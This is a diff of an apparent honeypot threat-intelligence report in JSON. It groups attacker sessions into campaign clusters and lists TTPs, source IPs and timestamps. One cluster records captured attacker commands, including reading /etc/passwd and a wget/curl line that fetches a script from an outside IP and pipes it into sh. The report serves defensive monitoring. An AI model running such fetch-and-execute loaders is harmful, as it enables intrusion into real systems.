@@ -1,9 +1,9 @@
 {
-  "generated_at": "2026-08-10T19:02:00.212486+00:00",
-  "total_sessions_with_commands": 20,
-  "total_clusters": 5,
-  "campaign_clusters": 3,
-  "singleton_clusters": 4,
+  "generated_at": "2026-08-10T20:46:53.302511+00:00",
+  "total_sessions_with_commands": 187,
+  "total_clusters": 15,
+  "campaign_clusters": 4,
+  "singleton_clusters": 5,
   "highest_severity": "HIGH",
   "active_campaigns": [
     {
@@ -26,11 +26,11 @@
       ]
     },
     {
-      "cluster_id": "CLU-002",
+      "cluster_id": "CLU-003",
       "name": "Recon Loader Script",
       "severity": "MEDIUM",
-      "session_count": 16,
-      "unique_ip_count": 2,
+      "session_count": 142,
+      "unique_ip_count": 4,
       "ttps": [
         "T1082",
         "T1592",
@@ -39,11 +39,25 @@
       ]
     },
     {
-      "cluster_id": "CLU-005",
+      "cluster_id": "CLU-008",
       "name": "mdrfckr SSH Key Injection",
       "severity": "HIGH",
-      "session_count": 1,
-      "unique_ip_count": 1,
+      "session_count": 9,
+      "unique_ip_count": 9,
+      "ttps": [
+        "T1021.004",
+        "T1078",
+        "T1070",
+        "T1140",
+        "T1105"
+      ]
+    },
+    {
+      "cluster_id": "CLU-015",
+      "name": "mdrfckr SSH Key Injection",
+      "severity": "HIGH",
+      "session_count": 5,
+      "unique_ip_count": 5,
       "ttps": [
         "T1021.004",
         "T1078",
@@ -146,6 +160,65 @@
     },
     {
       "cluster_id": "CLU-002",
+      "is_campaign": false,
+      "campaign_name": null,
+      "campaign_severity": null,
+      "campaign_description": null,
+      "matched_campaigns": [],
+      "session_count": 2,
+      "unique_ips": [
+        "8.137.167.190",
+        "121.40.20.65"
+      ],
+      "unique_ip_count": 2,
+      "sequence_hash": "c5066f4a71b0151c",
+      "ttps": [
+        {
+          "id": "T1078",
+          "name": "Valid Accounts"
+        },
+        {
+          "id": "T1105",
+          "name": "Ingress Tool Transfer"
+        },
+        {
+          "id": "T1003",
+          "name": "Credential Dumping"
+        }
+      ],
+      "representative_commands": [
+        "id",
+        "cat /etc/passwd",
+        "echo -e \"\\x61\\x75\\x74\\x68\\x5F\\x6F\\x6B\\x0A\"",
+        "enable",
+        "system",
+        "shell",
+        "sh",
+        "bash",
+        "(wget --no-check-certificate -qO- https://217.60.195.113/sh || curl -sk https://217.60.195.113/sh) | sh -s telnet; echo -e \"\\x72\\x65\\x64\\x74\\x61\\x69\\x6C\\x5F\\x62\\x6F\\x74\\x5F\\x74\\x65\\x6C\\x6E\\x65\\x74\\x5F\\x6F\\x6B\"",
+        "wget --no-check-certificate -qO- https://217.60.195.113/sh"
+      ],
+      "members": [
+        {
+          "session_id": "IR-ad7b0b6f2f00",
+          "src_ip": "121.40.20.65",
+          "country": "CN",
+          "isp": "Aliyun Computing Co., LTD",
+          "command_count": 11,
+          "timestamp": "2026-08-10T04:15:28.054376Z"
+        },
+        {
+          "session_id": "IR-4eaf9829adbe",
+          "src_ip": "8.137.167.190",
+          "country": "CN",
+          "isp": "Aliyun Computing Co.LTD",
+          "command_count": 11,
+          "timestamp": "2026-08-10T11:06:22.761297Z"
+        }
+      ]
+    },
+    {
+      "cluster_id": "CLU-003",
       "is_campaign": true,
       "campaign_name": "Recon Loader Script",
       "campaign_severity": "MEDIUM",
@@ -176,12 +249,14 @@
           "pattern_total": 3
         }
       ],
-      "session_count": 16,
+      "session_count": 142,
       "unique_ips": [
+        "2.57.122.168",
         "193.32.162.84",
-        "2.57.122.168"
+        "92.118.39.14",
+        "193.32.162.27"
       ],
-      "unique_ip_count": 2,
+      "unique_ip_count": 4,
       "sequence_hash": "d2ac04915390abe8",
       "ttps": [
         {
@@ -214,137 +289,1293 @@
       ],
       "members": [
         {
-          "session_id": "IR-7bae72881ba6",
-          "src_ip": "193.32.162.84",
+          "session_id": "IR-2d0e18c51621",
+          "src_ip": "193.32.162.27",
           "country": "RO",
           "isp": "UNMANAGED LTD",
+          "command_count": 9,
+          "timestamp": "2026-08-10T00:00:54.012480Z"
+        },
+        {
+          "session_id": "IR-1e63e14d1711",
+          "src_ip": "193.32.162.27",
+          "country": "RO",
+          "isp": "UNMANAGED LTD",
+          "command_count": 9,
+          "timestamp": "2026-08-10T00:02:03.884147Z"
+        },
+        {
+          "session_id": "IR-6ef2a2b5355e",
+          "src_ip": "193.32.162.27",
+          "country": "RO",
+          "isp": "UNMANAGED LTD",
+          "command_count": 9,
+          "timestamp": "2026-08-10T00:03:11.590753Z"
+        },
+        {
+          "session_id": "IR-7ba917793ec2",
+          "src_ip": "193.32.162.27",
+          "country": "RO",
+          "isp": "UNMANAGED LTD",
+          "command_count": 9,
+          "timestamp": "2026-08-10T00:04:15.827414Z"
+        },
+        {
+          "session_id": "IR-cb527ab7e188",
+          "src_ip": "193.32.162.27",
+          "country": "RO",
+          "isp": "UNMANAGED LTD",
+          "command_count": 9,
+          "timestamp": "2026-08-10T00:05:18.075913Z"
+        },
+        {
+          "session_id": "IR-2f2fe35f5d8c",
+          "src_ip": "193.32.162.27",
+          "country": "RO",
+          "isp": "UNMANAGED LTD",
+          "command_count": 9,
+          "timestamp": "2026-08-10T00:06:19.461587Z"
+        },
+        {
+          "session_id": "IR-13f76dc2cb96",
+          "src_ip": "193.32.162.27",
+          "country": "RO",
+          "isp": "UNMANAGED LTD",
+          "command_count": 9,
+          "timestamp": "2026-08-10T00:07:14.635668Z"
+        },
+        {
+          "session_id": "IR-127b4bb164c9",
+          "src_ip": "193.32.162.27",
+          "country": "RO",
+          "isp": "UNMANAGED LTD",
+          "command_count": 9,
+          "timestamp": "2026-08-10T00:08:10.796418Z"
+        },
+        {
+          "session_id": "IR-ae8f12492e0b",
+          "src_ip": "193.32.162.27",
+          "country": "RO",
+          "isp": "UNMANAGED LTD",
+          "command_count": 9,
+          "timestamp": "2026-08-10T00:09:07.448545Z"
+        },
+        {
+          "session_id": "IR-442dfa97124c",
+          "src_ip": "193.32.162.27",
+          "country": "RO",
+          "isp": "UNMANAGED LTD",
+          "command_count": 9,
+          "timestamp": "2026-08-10T00:10:05.990803Z"
+        },
+        {
+          "session_id": "IR-6d9071aeed0b",
+          "src_ip": "193.32.162.27",
+          "country": "RO",
+          "isp": "UNMANAGED LTD",
+          "command_count": 9,
+          "timestamp": "2026-08-10T00:11:02.929813Z"
+        },
+        {
+          "session_id": "IR-158ee93f61ca",
+          "src_ip": "193.32.162.27",
+          "country": "RO",
+          "isp": "UNMANAGED LTD",
+          "command_count": 9,
+          "timestamp": "2026-08-10T00:11:59.894801Z"
+        },
+        {
+          "session_id": "IR-7d45bd637d95",
+          "src_ip": "193.32.162.27",
+          "country": "RO",
+          "isp": "UNMANAGED LTD",
+          "command_count": 9,
+          "timestamp": "2026-08-10T00:12:56.927800Z"
+        },
+        {
+          "session_id": "IR-a6895755c66b",
+          "src_ip": "193.32.162.27",
+          "country": "RO",
+          "isp": "UNMANAGED LTD",
+          "command_count": 9,
+          "timestamp": "2026-08-10T00:13:52.852860Z"
+        },
+        {
+          "session_id": "IR-0e74d4233255",
+          "src_ip": "92.118.39.14",
+          "country": "RO",
+          "isp": "DMZHOST",
+          "command_count": 9,
+          "timestamp": "2026-08-10T04:09:35.030794Z"
+        },
+        {
+          "session_id": "IR-e2b7faf6a43e",
+          "src_ip": "92.118.39.14",
+          "country": "RO",
+          "isp": "DMZHOST",
+          "command_count": 9,
+          "timestamp": "2026-08-10T04:12:04.440810Z"
+        },
+        {
+          "session_id": "IR-01dfe974d3c8",
+          "src_ip": "92.118.39.14",
+          "country": "RO",
+          "isp": "DMZHOST",
+          "command_count": 9,
+          "timestamp": "2026-08-10T04:14:32.715554Z"
+        },
+        {
+          "session_id": "IR-2decef47887e",
+          "src_ip": "92.118.39.14",
+          "country": "RO",
+          "isp": "DMZHOST",
+          "command_count": 9,
+          "timestamp": "2026-08-10T04:19:25.937546Z"
+        },
+        {
+          "session_id": "IR-e15597b5b48d",
+          "src_ip": "92.118.39.14",
+          "country": "RO",
+          "isp": "DMZHOST",
+          "command_count": 9,
+          "timestamp": "2026-08-10T04:21:46.930321Z"
+        },
+        {
+          "session_id": "IR-9c7ffb5c97d2",
+          "src_ip": "92.118.39.14",
+          "country": "RO",
+          "isp": "DMZHOST",
+          "command_count": 9,
+          "timestamp": "2026-08-10T04:24:07.082040Z"
+        },
+        {
+          "session_id": "IR-4c487dd80575",
+          "src_ip": "92.118.39.14",
+          "country": "RO",
+          "isp": "DMZHOST",
+          "command_count": 9,
+          "timestamp": "2026-08-10T04:26:27.928064Z"
+        },
+        {
+          "session_id": "IR-56219686a2c2",
+          "src_ip": "92.118.39.14",
+          "country": "RO",
+          "isp": "DMZHOST",
+          "command_count": 9,
+          "timestamp": "2026-08-10T04:28:44.223428Z"
+        },
+        {
+          "session_id": "IR-f7428ca3d482",
+          "src_ip": "92.118.39.14",
+          "country": "RO",
+          "isp": "DMZHOST",
+          "command_count": 9,
+          "timestamp": "2026-08-10T04:31:08.343146Z"
+        },
+        {
+          "session_id": "IR-1a32bf4a9f56",
+          "src_ip": "92.118.39.14",
+          "country": "RO",
+          "isp": "DMZHOST",
+          "command_count": 9,
+          "timestamp": "2026-08-10T04:33:30.849416Z"
+        },
+        {
+          "session_id": "IR-90f3f5f0b3ee",
+          "src_ip": "92.118.39.14",
+          "country": "RO",
+          "isp": "DMZHOST",
+          "command_count": 9,
+          "timestamp": "2026-08-10T04:35:52.245574Z"
+        },
+        {
+          "session_id": "IR-c134cfad2c5b",
+          "src_ip": "92.118.39.14",
+          "country": "RO",
+          "isp": "DMZHOST",
+          "command_count": 9,
+          "timestamp": "2026-08-10T04:38:11.968397Z"
+        },
+        {
+          "session_id": "IR-90cda6f2956e",
+          "src_ip": "92.118.39.14",
+          "country": "RO",
+          "isp": "DMZHOST",
+          "command_count": 9,
+          "timestamp": "2026-08-10T04:40:36.092190Z"
+        },
+        {
+          "session_id": "IR-d7fce2e8a978",
+          "src_ip": "92.118.39.14",
+          "country": "RO",
+          "isp": "DMZHOST",
+          "command_count": 9,
+          "timestamp": "2026-08-10T04:42:58.004909Z"
+        },
+        {
+          "session_id": "IR-328e619c24e9",
+          "src_ip": "92.118.39.14",
+          "country": "RO",
+          "isp": "DMZHOST",
+          "command_count": 9,
+          "timestamp": "2026-08-10T04:45:15.037585Z"
+        },
+        {
+          "session_id": "IR-55fa3ec8efc0",
+          "src_ip": "92.118.39.14",
+          "country": "RO",
+          "isp": "DMZHOST",
+          "command_count": 9,
+          "timestamp": "2026-08-10T04:47:34.593816Z"
+        },
+        {
+          "session_id": "IR-0ddbd8417a08",
+          "src_ip": "92.118.39.14",
+          "country": "RO",
+          "isp": "DMZHOST",
+          "command_count": 9,
+          "timestamp": "2026-08-10T04:49:51.753093Z"
+        },
+        {
+          "session_id": "IR-f30b303cce4a",
+          "src_ip": "92.118.39.14",
+          "country": "RO",
+          "isp": "DMZHOST",
+          "command_count": 9,
+          "timestamp": "2026-08-10T04:52:12.386189Z"
+        },
+        {
+          "session_id": "IR-0991db8bd947",
+          "src_ip": "92.118.39.14",
+          "country": "RO",
+          "isp": "DMZHOST",
+          "command_count": 9,
+          "timestamp": "2026-08-10T04:54:29.024472Z"
+        },
+        {
+          "session_id": "IR-82c72622fa08",
+          "src_ip": "92.118.39.14",
+          "country": "RO",
+          "isp": "DMZHOST",
+          "command_count": 9,
+          "timestamp": "2026-08-10T04:56:45.962543Z"
+        },
+        {
+          "session_id": "IR-ecaa55403838",
+          "src_ip": "92.118.39.14",
+          "country": "RO",
+          "isp": "DMZHOST",
+          "command_count": 9,
+          "timestamp": "2026-08-10T04:59:03.621129Z"
+        },
+        {
+          "session_id": "IR-a4db37fcf14e",
+          "src_ip": "92.118.39.14",
+          "country": "RO",
+          "isp": "DMZHOST",
+          "command_count": 9,
+          "timestamp": "2026-08-10T05:01:17.203580Z"
+        },
+        {
+          "session_id": "IR-4d9d7252df0a",
+          "src_ip": "92.118.39.14",
+          "country": "RO",
+          "isp": "DMZHOST",
+          "command_count": 9,
+          "timestamp": "2026-08-10T05:03:30.167871Z"
+        },
+        {
+          "session_id": "IR-6f5ed51f5c45",
+          "src_ip": "92.118.39.14",
+          "country": "RO",
+          "isp": "DMZHOST",
+          "command_count": 9,
+          "timestamp": "2026-08-10T05:05:41.259447Z"
+        },
+        {
+          "session_id": "IR-7db0257bd7c1",
+          "src_ip": "92.118.39.14",
+          "country": "RO",
+          "isp": "DMZHOST",
+          "command_count": 9,
+          "timestamp": "2026-08-10T05:07:51.509962Z"
+        },
+        {
+          "session_id": "IR-ce33b3d38017",
+          "src_ip": "92.118.39.14",
+          "country": "RO",
+          "isp": "DMZHOST",
+          "command_count": 9,
+          "timestamp": "2026-08-10T05:10:08.288794Z"
+        },
+        {
+          "session_id": "IR-f697f93d14d9",
+          "src_ip": "92.118.39.14",
+          "country": "RO",
+          "isp": "DMZHOST",
+          "command_count": 9,
+          "timestamp": "2026-08-10T05:12:30.349455Z"
+        },
+        {
+          "session_id": "IR-64d4180e60e2",
+          "src_ip": "92.118.39.14",
+          "country": "RO",
+          "isp": "DMZHOST",
+          "command_count": 9,
+          "timestamp": "2026-08-10T05:15:02.343140Z"
+        },
+        {
+          "session_id": "IR-eda42123fa68",
+          "src_ip": "92.118.39.14",
+          "country": "RO",
+          "isp": "DMZHOST",
+          "command_count": 9,
+          "timestamp": "2026-08-10T05:17:21.024366Z"
+        },
+        {
+          "session_id": "IR-4d85daef9f90",
+          "src_ip": "92.118.39.14",
+          "country": "RO",
+          "isp": "DMZHOST",
+          "command_count": 9,
+          "timestamp": "2026-08-10T05:19:33.623004Z"
+        },
+        {
+          "session_id": "IR-072b4c9f9f89",
+          "src_ip": "92.118.39.14",
+          "country": "RO",
+          "isp": "DMZHOST",
+          "command_count": 9,
+          "timestamp": "2026-08-10T05:21:41.638974Z"
+        },
+        {
+          "session_id": "IR-9c3ca8b3b4ca",
+          "src_ip": "92.118.39.14",
+          "country": "RO",
+          "isp": "DMZHOST",
+          "command_count": 9,
+          "timestamp": "2026-08-10T05:23:51.252080Z"
+        },
+        {
+          "session_id": "IR-01be7afe37aa",
+          "src_ip": "92.118.39.14",
+          "country": "RO",
+          "isp": "DMZHOST",
+          "command_count": 9,
+          "timestamp": "2026-08-10T05:26:01.793732Z"
+        },
+        {
+          "session_id": "IR-212f68c9dd1a",
+          "src_ip": "92.118.39.14",
+          "country": "RO",
+          "isp": "DMZHOST",
+          "command_count": 9,
+          "timestamp": "2026-08-10T05:28:10.938876Z"
+        },
+        {
+          "session_id": "IR-f80614b68f51",
+          "src_ip": "92.118.39.14",
+          "country": "RO",
+          "isp": "DMZHOST",
+          "command_count": 9,
+          "timestamp": "2026-08-10T05:30:20.104093Z"
+        },
+        {
+          "session_id": "IR-8112e5a859dc",
+          "src_ip": "92.118.39.14",
+          "country": "RO",
+          "isp": "DMZHOST",
+          "command_count": 9,
+          "timestamp": "2026-08-10T05:32:26.750206Z"
+        },
+        {
+          "session_id": "IR-92e7984ea4fc",
+          "src_ip": "92.118.39.14",
+          "country": "RO",
+          "isp": "DMZHOST",
+          "command_count": 9,
+          "timestamp": "2026-08-10T05:34:31.191047Z"
+        },
+        {
+          "session_id": "IR-97e38b536bbe",
+          "src_ip": "92.118.39.14",
+          "country": "RO",
+          "isp": "DMZHOST",
+          "command_count": 9,
+          "timestamp": "2026-08-10T05:36:38.838450Z"
+        },
+        {
+          "session_id": "IR-8bb2b8c55162",
+          "src_ip": "92.118.39.14",
+          "country": "RO",
+          "isp": "DMZHOST",
+          "command_count": 9,
+          "timestamp": "2026-08-10T05:38:47.399701Z"
+        },
+        {
+          "session_id": "IR-54d703730b6d",
+          "src_ip": "92.118.39.14",
+          "country": "RO",
+          "isp": "DMZHOST",
+          "command_count": 9,
+          "timestamp": "2026-08-10T05:41:00.751823Z"
+        },
+        {
+          "session_id": "IR-5738fc9ffbaf",
+          "src_ip": "92.118.39.14",
+          "country": "RO",
+          "isp": "DMZHOST",
+          "command_count": 9,
+          "timestamp": "2026-08-10T05:43:14.578880Z"
+        },
+        {
+          "session_id": "IR-2c6f5ed6a9ae",
+          "src_ip": "92.118.39.14",
+          "country": "RO",
+          "isp": "DMZHOST",
+          "command_count": 9,
+          "timestamp": "2026-08-10T05:45:36.391321Z"
+        },
+        {
+          "session_id": "IR-5a8b54523e9f",
+          "src_ip": "92.118.39.14",
+          "country": "RO",
+          "isp": "DMZHOST",
+          "command_count": 9,
+          "timestamp": "2026-08-10T05:47:53.044002Z"
+        },
+        {
+          "session_id": "IR-bf15637068b2",
+          "src_ip": "92.118.39.14",
+          "country": "RO",
+          "isp": "DMZHOST",
+          "command_count": 9,
+          "timestamp": "2026-08-10T05:50:11.165818Z"
+        },
+        {
+          "session_id": "IR-77f4fb669431",
+          "src_ip": "92.118.39.14",
+          "country": "RO",
+          "isp": "DMZHOST",
+          "command_count": 9,
+          "timestamp": "2026-08-10T05:52:32.250244Z"
+        },
+        {
+          "session_id": "IR-4293e819ea15",
+          "src_ip": "92.118.39.14",
+          "country": "RO",
+          "isp": "DMZHOST",
+          "command_count": 9,
+          "timestamp": "2026-08-10T05:54:50.962646Z"
+        },
+        {
+          "session_id": "IR-3bd9868da6d0",
+          "src_ip": "92.118.39.14",
+          "country": "RO",
+          "isp": "DMZHOST",
+          "command_count": 9,
+          "timestamp": "2026-08-10T05:57:03.685647Z"
+        },
+        {
+          "session_id": "IR-26351ab35f17",
+          "src_ip": "92.118.39.14",
+          "country": "RO",
+          "isp": "DMZHOST",
+          "command_count": 9,
+          "timestamp": "2026-08-10T05:59:12.650867Z"
+        },
+        {
+          "session_id": "IR-f01d47ee57d1",
+          "src_ip": "92.118.39.14",
+          "country": "RO",
+          "isp": "DMZHOST",
+          "command_count": 9,
+          "timestamp": "2026-08-10T06:01:23.716372Z"
+        },
+        {
+          "session_id": "IR-7717d6653b8d",
+          "src_ip": "92.118.39.14",
+          "country": "RO",
+          "isp": "DMZHOST",
+          "command_count": 9,
+          "timestamp": "2026-08-10T06:03:30.713540Z"
+        },
+        {
+          "session_id": "IR-96ac39495c43",
+          "src_ip": "92.118.39.14",
+          "country": "RO",
+          "isp": "DMZHOST",
+          "command_count": 9,
+          "timestamp": "2026-08-10T06:05:37.678877Z"
+        },
+        {
+          "session_id": "IR-0f27fa5825fb",
+          "src_ip": "92.118.39.14",
+          "country": "RO",
+          "isp": "DMZHOST",
+          "command_count": 9,
+          "timestamp": "2026-08-10T06:07:42.966315Z"
+        },
+        {
+          "session_id": "IR-c656d9e17d53",
+          "src_ip": "92.118.39.14",
+          "country": "RO",
+          "isp": "DMZHOST",
+          "command_count": 9,
+          "timestamp": "2026-08-10T06:09:49.383737Z"
+        },
+        {
+          "session_id": "IR-45edf92d076d",
+          "src_ip": "92.118.39.14",
+          "country": "RO",
+          "isp": "DMZHOST",
+          "command_count": 9,
+          "timestamp": "2026-08-10T06:12:00.838382Z"
+        },
+        {
+          "session_id": "IR-209fd2efca6b",
+          "src_ip": "92.118.39.14",
+          "country": "RO",
+          "isp": "DMZHOST",
+          "command_count": 9,
+          "timestamp": "2026-08-10T06:14:12.567607Z"
+        },
+        {
+          "session_id": "IR-0ddc763d82a8",
+          "src_ip": "92.118.39.14",
+          "country": "RO",
+          "isp": "DMZHOST",
+          "command_count": 9,
+          "timestamp": "2026-08-10T06:16:26.431072Z"
+        },
+        {
+          "session_id": "IR-19fcd4456aed",
+          "src_ip": "92.118.39.14",
+          "country": "RO",
+          "isp": "DMZHOST",
+          "command_count": 9,
+          "timestamp": "2026-08-10T06:18:37.464219Z"
+        },
+        {
+          "session_id": "IR-0cf0ab426f9b",
+          "src_ip": "92.118.39.14",
+          "country": "RO",
+          "isp": "DMZHOST",
+          "command_count": 9,
+          "timestamp": "2026-08-10T06:20:48.806251Z"
+        },
+        {
+          "session_id": "IR-550f3fab62fd",
+          "src_ip": "92.118.39.14",
+          "country": "RO",
+          "isp": "DMZHOST",
+          "command_count": 9,
+          "timestamp": "2026-08-10T06:23:03.713240Z"
+        },
+        {
+          "session_id": "IR-afe6c8e2fce3",
+          "src_ip": "92.118.39.14",
+          "country": "RO",
+          "isp": "DMZHOST",
+          "command_count": 9,
+          "timestamp": "2026-08-10T06:25:17.185777Z"
+        },
+        {
+          "session_id": "IR-df53a7a368d5",
+          "src_ip": "92.118.39.14",
+          "country": "RO",
+          "isp": "DMZHOST",
+          "command_count": 9,
+          "timestamp": "2026-08-10T06:27:38.210002Z"
+        },
+        {
+          "session_id": "IR-b0327e00434c",
+          "src_ip": "92.118.39.14",
+          "country": "RO",
+          "isp": "DMZHOST",
+          "command_count": 9,
+          "timestamp": "2026-08-10T06:29:59.721981Z"
+        },
+        {
+          "session_id": "IR-57eebc1d1c29",
+          "src_ip": "92.118.39.14",
+          "country": "RO",
+          "isp": "DMZHOST",
+          "command_count": 9,
+          "timestamp": "2026-08-10T14:33:49.022417Z"
+        },
+        {
+          "session_id": "IR-18c55a295caa",
+          "src_ip": "92.118.39.14",
+          "country": "RO",
+          "isp": "DMZHOST",
+          "command_count": 9,
+          "timestamp": "2026-08-10T14:36:00.071701Z"
+        },
+        {
+          "session_id": "IR-1b6bb158d5c6",
+          "src_ip": "92.118.39.14",
+          "country": "RO",
+          "isp": "DMZHOST",
+          "command_count": 9,
+          "timestamp": "2026-08-10T14:38:08.452804Z"
+        },
+        {
+          "session_id": "IR-7c7f419f036c",
+          "src_ip": "92.118.39.14",
+          "country": "RO",
+          "isp": "DMZHOST",
+          "command_count": 9,
+          "timestamp": "2026-08-10T14:40:15.045276Z"
+        },
+        {
+          "session_id": "IR-9b26a688991a",
+          "src_ip": "92.118.39.14",
+          "country": "RO",
+          "isp": "DMZHOST",
+          "command_count": 9,
+          "timestamp": "2026-08-10T14:42:21.915315Z"
+        },
+        {
+          "session_id": "IR-1697b23efe09",
+          "src_ip": "92.118.39.14",
+          "country": "RO",
+          "isp": "DMZHOST",
+          "command_count": 9,
+          "timestamp": "2026-08-10T14:46:32.949889Z"
+        },
+        {
+          "session_id": "IR-3b09b1fa450a",
+          "src_ip": "92.118.39.14",
+          "country": "RO",
+          "isp": "DMZHOST",
+          "command_count": 9,
+          "timestamp": "2026-08-10T14:48:39.052949Z"
+        },
+        {
+          "session_id": "IR-dbb7f4db0de9",
+          "src_ip": "92.118.39.14",
+          "country": "RO",
+          "isp": "DMZHOST",
+          "command_count": 9,
+          "timestamp": "2026-08-10T14:50:45.055106Z"
+        },
+        {
+          "session_id": "IR-6157349e3f0a",
+          "src_ip": "92.118.39.14",
+          "country": "RO",
+          "isp": "DMZHOST",
+          "command_count": 9,
+          "timestamp": "2026-08-10T14:52:53.110409Z"
+        },
+        {
+          "session_id": "IR-a21a86f87756",
+          "src_ip": "92.118.39.14",
+          "country": "RO",
+          "isp": "DMZHOST",
+          "command_count": 9,
+          "timestamp": "2026-08-10T14:55:05.541051Z"
+        },
+        {
+          "session_id": "IR-2b3dadf56295",
+          "src_ip": "92.118.39.14",
+          "country": "RO",
+          "isp": "DMZHOST",
+          "command_count": 9,
+          "timestamp": "2026-08-10T14:57:14.141177Z"
+        },
+        {
+          "session_id": "IR-dd33a88f911e",
+          "src_ip": "92.118.39.14",
+          "country": "RO",
+          "isp": "DMZHOST",
+          "command_count": 9,
+          "timestamp": "2026-08-10T14:59:25.280979Z"
+        },
+        {
+          "session_id": "IR-73cbc72ce3c6",
+          "src_ip": "92.118.39.14",
+          "country": "RO",
+          "isp": "DMZHOST",
+          "command_count": 9,
+          "timestamp": "2026-08-10T15:01:36.818482Z"
+        },
+        {
+          "session_id": "IR-129e2bbbc0d9",
+          "src_ip": "92.118.39.14",
+          "country": "RO",
+          "isp": "DMZHOST",
+          "command_count": 9,
+          "timestamp": "2026-08-10T15:03:37.546699Z"
+        },
+        {
+          "session_id": "IR-f86fd24e9d4c",
+          "src_ip": "92.118.39.14",
+          "country": "RO",
+          "isp": "DMZHOST",
+          "command_count": 9,
+          "timestamp": "2026-08-10T15:05:35.748800Z"
+        },
+        {
+          "session_id": "IR-d2f3d7e4fefb",
+          "src_ip": "92.118.39.14",
+          "country": "RO",
+          "isp": "DMZHOST",
+          "command_count": 9,
+          "timestamp": "2026-08-10T15:07:32.599378Z"
+        },
+        {
+          "session_id": "IR-c67fd2adfdd7",
+          "src_ip": "92.118.39.14",
+          "country": "RO",
+          "isp": "DMZHOST",
+          "command_count": 9,
+          "timestamp": "2026-08-10T15:09:31.103325Z"
+        },
+        {
+          "session_id": "IR-3430bd259804",
+          "src_ip": "92.118.39.14",
+          "country": "RO",
+          "isp": "DMZHOST",
+          "command_count": 9,
+          "timestamp": "2026-08-10T15:11:29.449142Z"
+        },
+        {
+          "session_id": "IR-a4c2f9de3dbf",
+          "src_ip": "92.118.39.14",
+          "country": "RO",
+          "isp": "DMZHOST",
+          "command_count": 9,
+          "timestamp": "2026-08-10T15:13:27.702532Z"
+        },
+        {
+          "session_id": "IR-68404b78764c",
+          "src_ip": "92.118.39.14",
+          "country": "RO",
+          "isp": "DMZHOST",
+          "command_count": 9,
+          "timestamp": "2026-08-10T15:15:30.480687Z"
+        },
+        {
+          "session_id": "IR-b3edfcd680d9",
+          "src_ip": "92.118.39.14",
+          "country": "RO",
+          "isp": "DMZHOST",
+          "command_count": 9,
+          "timestamp": "2026-08-10T15:17:41.354071Z"
+        },
+        {
+          "session_id": "IR-c2a0a09519de",
+          "src_ip": "92.118.39.14",
+          "country": "RO",
+          "isp": "DMZHOST",
+          "command_count": 9,
+          "timestamp": "2026-08-10T15:20:00.628047Z"
+        },
+        {
+          "session_id": "IR-d78cd0b84e13",
+          "src_ip": "92.118.39.14",
+          "country": "RO",
+          "isp": "DMZHOST",
+          "command_count": 9,
+          "timestamp": "2026-08-10T15:22:18.968298Z"
+        },
+        {
+          "session_id": "IR-6d67db7cc8fb",
+          "src_ip": "92.118.39.14",
+          "country": "RO",
+          "isp": "DMZHOST",
+          "command_count": 9,
+          "timestamp": "2026-08-10T15:24:18.507541Z"
+        },
+        {
+          "session_id": "IR-ad45e48b8e65",
+          "src_ip": "92.118.39.14",
+          "country": "RO",
+          "isp": "DMZHOST",
+          "command_count": 9,
+          "timestamp": "2026-08-10T15:26:14.983468Z"
+        },
+        {
+          "session_id": "IR-e8da9d1869f7",
+          "src_ip": "92.118.39.14",
+          "country": "RO",
+          "isp": "DMZHOST",
+          "command_count": 9,
+          "timestamp": "2026-08-10T15:30:11.012429Z"
+        },
+        {
+          "session_id": "IR-75ccd3f97a5c",
+          "src_ip": "92.118.39.14",
+          "country": "RO",
+          "isp": "DMZHOST",
+          "command_count": 9,
+          "timestamp": "2026-08-10T15:32:19.307988Z"
+        },
+        {
+          "session_id": "IR-c6d9455a1ed8",
+          "src_ip": "92.118.39.14",
+          "country": "RO",
+          "isp": "DMZHOST",
+          "command_count": 9,
+          "timestamp": "2026-08-10T15:34:46.032674Z"
+        },
+        {
+          "session_id": "IR-c21f82bd9f77",
+          "src_ip": "92.118.39.14",
+          "country": "RO",
+          "isp": "DMZHOST",
+          "command_count": 9,
+          "timestamp": "2026-08-10T15:36:58.849411Z"
+        },
+        {
+          "session_id": "IR-ecd7125e9d33",
+          "src_ip": "92.118.39.14",
+          "country": "RO",
+          "isp": "DMZHOST",
+          "command_count": 9,
+          "timestamp": "2026-08-10T15:38:58.469648Z"
+        },
+        {
+          "session_id": "IR-0978e7096757",
+          "src_ip": "92.118.39.14",
+          "country": "RO",
+          "isp": "DMZHOST",
+          "command_count": 9,
+          "timestamp": "2026-08-10T15:40:59.352983Z"
+        },
+        {
+          "session_id": "IR-d900d83953b4",
+          "src_ip": "92.118.39.14",
+          "country": "RO",
+          "isp": "DMZHOST",
+          "command_count": 9,
+          "timestamp": "2026-08-10T15:43:06.900603Z"
+        },
+        {
+          "session_id": "IR-0ba92be9a418",
+          "src_ip": "92.118.39.14",
+          "country": "RO",
+          "isp": "DMZHOST",
+          "command_count": 9,
+          "timestamp": "2026-08-10T15:45:13.629521Z"
+        },
+        {
+          "session_id": "IR-fc72be1c478a",
+          "src_ip": "92.118.39.14",
+          "country": "RO",
+          "isp": "DMZHOST",
+          "command_count": 9,
+          "timestamp": "2026-08-10T15:47:20.077468Z"
+        },
+        {
+          "session_id": "IR-d7035dcdbc86",
+          "src_ip": "92.118.39.14",
+          "country": "RO",
+          "isp": "DMZHOST",
+          "command_count": 9,
+          "timestamp": "2026-08-10T15:49:44.063439Z"
+        },
+        {
+          "session_id": "IR-bc87af71ff15",
+          "src_ip": "92.118.39.14",
+          "country": "RO",
+          "isp": "DMZHOST",
+          "command_count": 9,
+          "timestamp": "2026-08-10T15:52:14.170968Z"
+        },
+        {
+          "session_id": "IR-f2a5be66c3e2",
+          "src_ip": "92.118.39.14",
+          "country": "RO",
+          "isp": "DMZHOST",
+          "command_count": 9,
+          "timestamp": "2026-08-10T15:54:21.050106Z"
+        },
+        {
+          "session_id": "IR-13af6c4da292",
+          "src_ip": "92.118.39.14",
+          "country": "RO",
+          "isp": "DMZHOST",
+          "command_count": 9,
+          "timestamp": "2026-08-10T15:56:22.488977Z"
+        },
+        {
+          "session_id": "IR-6fd68ce8a215",
+          "src_ip": "92.118.39.14",
+          "country": "RO",
+          "isp": "DMZHOST",
+          "command_count": 9,
+          "timestamp": "2026-08-10T15:58:21.690554Z"
+        },
+        {
+          "session_id": "IR-ec16bf221747",
+          "src_ip": "92.118.39.14",
+          "country": "RO",
+          "isp": "DMZHOST",
+          "command_count": 9,
+          "timestamp": "2026-08-10T16:00:10.771418Z"
+        },
+        {
+          "session_id": "IR-3fc013d523e2",
+          "src_ip": "92.118.39.14",
+          "country": "RO",
+          "isp": "DMZHOST",
+          "command_count": 9,
